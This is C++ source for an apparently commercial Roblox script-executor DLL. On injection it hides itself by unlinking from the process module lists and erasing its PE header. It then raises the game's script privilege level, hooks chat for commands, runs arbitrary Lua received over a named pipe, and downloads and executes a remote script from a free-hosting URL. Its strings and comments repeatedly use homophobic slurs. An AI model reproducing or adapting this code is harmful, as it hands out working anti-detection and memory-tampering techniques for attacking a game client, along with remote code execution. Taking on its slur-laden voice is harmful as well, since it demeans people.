
#include <Windows.h>
#include <string>
#include <iostream>
#include <Psapi.h>


#include "Offsets.h"
#include "ConsoleCol.h"
#include "LuaWrapper.h"
#include "Authentication.h"
#include "Bypasses.h"

#include "Functions/FunctionIncludes.h"
#include "Functions/CoreFunctions.h"


DWORD WINAPI LuaPipe(PVOID lvpParameter)
{
	std::string WholeScript = "";
	HANDLE hPipe;
	char buffer[999999];
	DWORD dwRead;
	hPipe = CreateNamedPipe(TEXT("\\\\.\\pipe\\ReadMeYouGay"),
		PIPE_ACCESS_DUPLEX | PIPE_TYPE_BYTE | PIPE_READMODE_BYTE,
		PIPE_WAIT,
		1,
		999999,
		999999,
		NMPWAIT_USE_DEFAULT_WAIT,
		NULL);
	while (hPipe != INVALID_HANDLE_VALUE)
	{
		if (ConnectNamedPipe(hPipe, NULL) != FALSE)
		{
			while (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL) != FALSE)
			{
				buffer[dwRead] = '\0';
				try {
					try {
						WholeScript = WholeScript + buffer;
					}
					catch (...) {
					}
				}
				catch (std::exception e) {

				}
				catch (...) {

				}
			}
			Wrapper::Execute_Script(WholeScript);
			WholeScript = "";
		}
		DisconnectNamedPipe(hPipe);
	}
}

void ConsoleBypass(const char* Title) {
	DWORD superskiddoisachink;
	VirtualProtect((PVOID)&FreeConsole, 1, PAGE_EXECUTE_READWRITE, &superskiddoisachink);
	*(BYTE*)(&FreeConsole) = 0xC3;
	AllocConsole();
	SetConsoleTitleA(Title);
	freopen("CONOUT$", "w", stdout);
	freopen("CONIN$", "r", stdin);
	HWND ConsoleHandle = GetConsoleWindow();
	::SetWindowPos(ConsoleHandle, HWND_TOPMOST, 0, 0, 0, 0, SWP_DRAWFRAME | SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
	::ShowWindow(ConsoleHandle, SW_NORMAL);
}

#define seti(rL, i) DWORD* identity = (DWORD*)(rL - 32); *identity ^= (i ^ (unsigned __int8)*identity) & 0x1F;

void WrapGlobal(DWORD RLS, lua_State* LS, const char* Index) {
	r_l_getglobal(RLS, Index);
	Wrap(RLS, LS, -1); // yo br Screenshare once ur testing? kk yay ty :D
	lua_setglobal(LS, Index);
	r_l_pop(RLS, 1); // pops aka removes some shit?? i think
}




/*Chat Hook Shit*/

int GetChatMessage(DWORD luaState) {
	//oWo LOOK NO CALLCHECK DISABLE NEEDED FAGGOTS
	std::string chatMsg = r_l_tostring(luaState, 1);
	if (chatMsg.substr(0, 1) == ";") {
		chatMsg = chatMsg.substr(1, string::npos);
		//RunCommand(chatMsg);
		return 0;
	}
}

/*Chat Hook Shit*/


void InitWrapper();

string GetLocalPlayerName() {
	r_l_getglobal(RLS, "game");
	r_l_getfield(RLS, -1, "Players");
	r_l_getfield(RLS, -1, "LocalPlayer");
	r_l_getfield(RLS, -1, "Name");
	return r_l_tolstring(RLS, -1, NULL);
}

void MainInit() {
	ConsoleBypass("FaggotSploit -- Console.");
	std::cout << iyellow << "Scanning... ";
	ScriptContext = Memory::Scan((BYTE*)&ScriptContextVFT_Addy, (BYTE*)"xxxx", PAGE_READWRITE);
	if (!ScriptContext) {
		std::cout << ired << "ScriptContext Scan Failed!\n";
		system("pause");
		exit(0);
	}

	int v39 = ScriptContext;
	int v51 = 0;
	RLS = v39 + 56 * v51 + 164 + *(DWORD *)(v39 + 56 * v51 + 164);
	if (!RLS) {
		std::cout << ired << "Failed to set roblox lua state!\n";
		system("pause");
		exit(0);
	}

	LS = luaL_newstate();
	if (!LS)
	{
		std::cout << ired << "Failed to init vanilla lua state!\n";
		system("pause");
		exit(0);
	}
	luaL_openlibs(LS);

	std::cout << igreen << "Success!\n";

	std::cout << iyellow << "Authenticating... ";
	
	yesnt("Roblox USer1!");

	if (firstime)
	{
		ShowWindow(GetConsoleWindow(), SW_HIDE);
		MessageBoxA(NULL, "It Seems To Be Your First Time Using FaggotSploit", "First Time", MB_OK);
		MessageBoxA(NULL, "To Run Commands Type ; commandhere me/playername in the roblox chat!", "First Time", MB_OK);
		MessageBoxA(NULL, "To Run Full Lua, Paste In A Script In The UI And Press Execute!", "First Time", MB_OK);
		MessageBoxA(NULL, "Thanks For Buying Premium, We Hope You Enjoy!", "First Time", MB_OK);
		ShowWindow(GetConsoleWindow(), SW_SHOW);
	}

	std::cout << iyellow << "Setting Level 6 Identity... ";
	seti(RLS, 6);
	std::cout << igreen << "Success!\n";

	std::cout << iyellow << "Setting Up Commands... ";

	EnableInt3BPHandler();

	r_l_getfield(RLS, -10002, "game");
	r_l_getfield(RLS, -1, "Players");
	r_l_getfield(RLS, -1, "LocalPlayer");
	r_l_getfield(RLS, -1, "Chatted");
	r_l_getfield(RLS, -1, "connect");
	r_l_pushvalue(RLS, -2);
	PushCClosureBP(GetChatMessage, 1);
	r_l_pcall(RLS, 2, 0, 0);
	r_l_emptystack(RLS);

	std::cout << igreen << "Success!\n";

	if (ispremiumuser)
	{
		InitWrapper();
	}
	else
	{
		std::cout << iblue << "Remember To Buy Premium To Gain Access To The Full Lua Execution!\n";
	}

	std::cout << aeblue << "Lua State: " << std::hex << RLS << endl;
	std::cout << aeblue << "ScriptContext: " << std::hex << ScriptContext << endl;
	std::cout << ipurple << "Ready For Execution!\n";
	if (ispremiumuser) { 
		std::string MOTD = DownloadURL("https://pandabrowser.000webhostapp.com/Fag/MOTD.txt");
		Wrapper::Execute_Script(MOTD);
	}
}


void InitWrapper() {
	std::cout << iblue << "Thanks For Buying Premium!\n";
	std::cout << iyellow << "Setting Up Full Lua... ";

	EnableInt3BPHandler();

	RegisterCustomFunctions(LS);

	lua_newtable(LS);
	lua_pushcfunction(LS, GlobalsIndex);
	lua_setfield(LS, -2, "__index");
	lua_pushstring(LS, "The metatable is locked");
	lua_setfield(LS, -2, "__metatable");
	lua_setmetatable(LS, LUA_GLOBALSINDEX);

	WrapGlobal(RLS, LS, "game");
	WrapGlobal(RLS, LS, "Game");
	WrapGlobal(RLS, LS, "workspace");
	WrapGlobal(RLS, LS, "Workspace");
	WrapGlobal(RLS, LS, "Instance");
	WrapGlobal(RLS, LS, "math");
	WrapGlobal(RLS, LS, "warn");
	WrapGlobal(RLS, LS, "shared");
	WrapGlobal(RLS, LS, "Wait");
	WrapGlobal(RLS, LS, "wait");
	WrapGlobal(RLS, LS, "delay");
	WrapGlobal(RLS, LS, "Delay");
	WrapGlobal(RLS, LS, "tick");
	WrapGlobal(RLS, LS, "LoadLibrary");
	WrapGlobal(RLS, LS, "Axes");
	WrapGlobal(RLS, LS, "BrickColor");
	WrapGlobal(RLS, LS, "CFrame");
	WrapGlobal(RLS, LS, "typeof");
	WrapGlobal(RLS, LS, "type");
	WrapGlobal(RLS, LS, "spawn");
	WrapGlobal(RLS, LS, "Spawn");
	WrapGlobal(RLS, LS, "print");
	WrapGlobal(RLS, LS, "printidentity");
	WrapGlobal(RLS, LS, "ypcall");
	WrapGlobal(RLS, LS, "Vector2int16");
	WrapGlobal(RLS, LS, "elapsedTime");
	WrapGlobal(RLS, LS, "version");
	WrapGlobal(RLS, LS, "PluginManager");
	WrapGlobal(RLS, LS, "require");
	WrapGlobal(RLS, LS, "stats");
	WrapGlobal(RLS, LS, "UserSettings");
	WrapGlobal(RLS, LS, "settings");
	WrapGlobal(RLS, LS, "Vector3");
	WrapGlobal(RLS, LS, "Vector3int16");
	WrapGlobal(RLS, LS, "Enum");
	WrapGlobal(RLS, LS, "Faces");
	WrapGlobal(RLS, LS, "Color3");
	WrapGlobal(RLS, LS, "Object");
	WrapGlobal(RLS, LS, "RBXScriptSignal");
	WrapGlobal(RLS, LS, "RBXScriptConnection");
	WrapGlobal(RLS, LS, "ColorSequence");
	WrapGlobal(RLS, LS, "ColorSequenceKeypoint");
	WrapGlobal(RLS, LS, "NumberRange");
	WrapGlobal(RLS, LS, "NumberSequence");
	WrapGlobal(RLS, LS, "NumberSequenceKeypoint");
	WrapGlobal(RLS, LS, "PhysicalProperties");
	WrapGlobal(RLS, LS, "Ray");
	WrapGlobal(RLS, LS, "Rect");
	WrapGlobal(RLS, LS, "Region3");
	WrapGlobal(RLS, LS, "Region3int16");
	WrapGlobal(RLS, LS, "TweenInfo");
	WrapGlobal(RLS, LS, "UDim");
	WrapGlobal(RLS, LS, "UDim2");
	WrapGlobal(RLS, LS, "Vector2");
	WrapGlobal(RLS, LS, "error");
	WrapGlobal(RLS, LS, "warn");
	WrapGlobal(RLS, LS, "shared");
	WrapGlobal(RLS, LS, "print");
	WrapGlobal(RLS, LS, "printidentity");
	WrapGlobal(RLS, LS, "warn");
	WrapGlobal(RLS, LS, "delay");
	WrapGlobal(RLS, LS, "spawn");
	WrapGlobal(RLS, LS, "elapsedTime");
	WrapGlobal(RLS, LS, "LoadLibrary");
	WrapGlobal(RLS, LS, "PluginManager");
	WrapGlobal(RLS, LS, "require");
	WrapGlobal(RLS, LS, "stats");
	WrapGlobal(RLS, LS, "tick");
	WrapGlobal(RLS, LS, "time");
	WrapGlobal(RLS, LS, "typeof");
	WrapGlobal(RLS, LS, "UserSettings");
	WrapGlobal(RLS, LS, "version");
	WrapGlobal(RLS, LS, "wait");
	WrapGlobal(RLS, LS, "math");
	WrapGlobal(RLS, LS, "wait");
	WrapGlobal(RLS, LS, "warn");
	WrapGlobal(RLS, LS, "error");
	WrapGlobal(RLS, LS, "delay");
	WrapGlobal(RLS, LS, "elapsedTime");
	WrapGlobal(RLS, LS, "printidentity");
	WrapGlobal(RLS, LS, "LoadLibrary");
	WrapGlobal(RLS, LS, "PlayerGui");
	WrapGlobal(RLS, LS, "PluginManager");
	WrapGlobal(RLS, LS, "require");
	WrapGlobal(RLS, LS, "script");
	WrapGlobal(RLS, LS, "DebuggerManager");
	WrapGlobal(RLS, LS, "_VERSION");
	WrapGlobal(RLS, LS, "xpcall");
	WrapGlobal(RLS, LS, "unpack");
	WrapGlobal(RLS, LS, "newproxy");
	WrapGlobal(RLS, LS, "collectgarbage");
	WrapGlobal(RLS, LS, "assert");
	WrapGlobal(RLS, LS, "utf8");

	r_l_getglobal(RLS, "game");
	r_l_getfield(RLS, -1, "ContentProvider");
	ContentProvider = (int)r_l_touserdata(RLS, -1); //used internally for GetObjects btw
	r_l_pop(RLS, 2);

	luaL_dostring(LS, "function GetObjects(assetId)\r\n    local obj = game:GetService(\"InsertService\"):LoadLocalAsset(assetId)\r\n    return { obj };\r\nend\r\n\r\nfunction ensure(obj)\r\n    for _,child in pairs(obj:GetChildren()) do\r\n        if (child.ClassName == \"LocalScript\") then\r\n            loadstring(child.Source)();\r\n            ensure(child);\r\n        else\r\n            ensure(child);\r\n        end\r\n    end\r\nend\r\n\r\n");
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)LuaPipe, NULL, NULL, NULL);
	std::cout << igreen << "Success!\n";
}



unsigned int ProtectSections(HMODULE Module
) {
	MODULEINFO ModuleInfo;
	GetModuleInformation(GetCurrentProcess(), Module, &ModuleInfo, sizeof(ModuleInfo));
	uintptr_t Address = reinterpret_cast<uintptr_t>(Module);
	uintptr_t TermAddress = Address + ModuleInfo.SizeOfImage;
	MEMORY_BASIC_INFORMATION MemoryInfo;


	while (Address < TermAddress) {
		VirtualQuery(reinterpret_cast<void*>(Address), &MemoryInfo, sizeof(MemoryInfo));
		if (MemoryInfo.State == MEM_COMMIT && (MemoryInfo.Protect & (PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY))) {
			DWORD OldProtection;
			VirtualProtect(reinterpret_cast<void*>(Address), MemoryInfo.RegionSize, PAGE_EXECUTE_READ, &OldProtection);
		}
		Address = reinterpret_cast<uintptr_t>(MemoryInfo.BaseAddress) + MemoryInfo.RegionSize;
	}
	VirtualQuery(reinterpret_cast<void*>(MemoryInfo.AllocationBase), &MemoryInfo, sizeof(MemoryInfo));
	if (MemoryInfo.State != MEM_COMMIT || !(MemoryInfo.Protect & PAGE_EXECUTE_READ))
		return 0x400;
	return MemoryInfo.RegionSize - 0x400;
}


__forceinline void UnlinkModule(HINSTANCE Module
) {
	unsigned long PEB_DATA = 0;
	_asm {
		pushad;
		pushfd;
		mov eax, fs:[30h]
			mov eax, [eax + 0Ch]
			mov PEB_DATA, eax

			InLoadOrderModuleList :
		mov esi, [eax + 0Ch]
			mov edx, [eax + 10h]

			LoopInLoadOrderModuleList :
			lodsd
			mov esi, eax
			mov ecx, [eax + 18h]
			cmp ecx, Module
			jne SkipA
			mov ebx, [eax]
			mov ecx, [eax + 4]
			mov[ecx], ebx
			mov[ebx + 4], ecx
			jmp InMemoryOrderModuleList

			SkipA :
		cmp edx, esi
			jne LoopInLoadOrderModuleList

			InMemoryOrderModuleList :
		mov eax, PEB_DATA
			mov esi, [eax + 14h]
			mov edx, [eax + 18h]

			LoopInMemoryOrderModuleList :
			lodsd
			mov esi, eax
			mov ecx, [eax + 10h]
			cmp ecx, Module
			jne SkipB
			mov ebx, [eax]
			mov ecx, [eax + 4]
			mov[ecx], ebx
			mov[ebx + 4], ecx
			jmp InInitializationOrderModuleList

			SkipB :
		cmp edx, esi
			jne LoopInMemoryOrderModuleList

			InInitializationOrderModuleList :
		mov eax, PEB_DATA
			mov esi, [eax + 1Ch]
			mov edx, [eax + 20h]

			LoopInInitializationOrderModuleList :
			lodsd
			mov esi, eax
			mov ecx, [eax + 08h]
			cmp ecx, Module
			jne SkipC
			mov ebx, [eax]
			mov ecx, [eax + 4]
			mov[ecx], ebx
			mov[ebx + 4], ecx
			jmp Finished

			SkipC :
		cmp edx, esi
			jne LoopInInitializationOrderModuleList

			Finished :
		popfd;
		popad;
	}
}


BOOL APIENTRY DllMain(HMODULE Module, DWORD Reason, void* Reserved)
{
	switch (Reason)
	{
	case DLL_PROCESS_ATTACH:
		DisableThreadLibraryCalls(Module);
		UnlinkModule(Module);
		DWORD OldProtection;
		VirtualProtect(Module, 4096, PAGE_READWRITE, &OldProtection);
		ZeroMemory(Module, 4096);
		ProtectSections(Module);
		HANDLE hThread = NULL;
		HANDLE hDllMainThread = OpenThread(THREAD_ALL_ACCESS, NULL, GetCurrentThreadId());
		if (Reserved == NULL) {
			if (!(hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MainInit, NULL, NULL, NULL))) {
				CloseHandle(hDllMainThread);
				return FALSE;
			}
			CloseHandle(hThread);
		}
		return TRUE;
	}
}
